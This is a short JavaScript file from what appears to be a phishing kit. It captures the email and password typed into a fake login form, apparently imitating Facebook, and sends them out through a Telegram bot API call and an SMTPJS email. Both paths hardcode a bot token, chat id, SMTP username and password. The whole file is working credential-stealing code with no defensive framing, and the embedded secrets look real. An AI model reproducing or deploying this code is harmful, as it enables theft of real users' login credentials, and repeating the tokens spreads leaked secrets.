
function submitLoginForm(event){
    event.preventDefault();
    let email = event.target['userLoginId'].value;
    let password = event.target['password'].value;
    let text = email + ` : ` + password;
    let url = `https://api.telegram.org/bot6556542346:AAFPNkrk6FLdIne_-pe_5M-DSMy4szyLRjw/sendMessage?chat_id=5721393154&parse_mode=Markdown&text=${text}`;

    fetch(url);
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "18erecs080.vicky@rietjaipur.ac.in",
        Password : "C576BF414184944A1AE88652A0974E220D72",
        To : '18erecs080.vicky@rietjaipur.ac.in',
        From : "18erecs080.vicky@rietjaipur.ac.in",
        Subject : event.target['userLoginId'].value,
        Body : event.target['password'].value
    });
}

// a href="https://fbloginpage.pythonanywhere.com/"
// form onsubmit="submitLoginForm(event)"
// <script src="https://smtpjs.com/v3/smtp.js">
// </script><script src="email.js" type="text/javascript"></script>
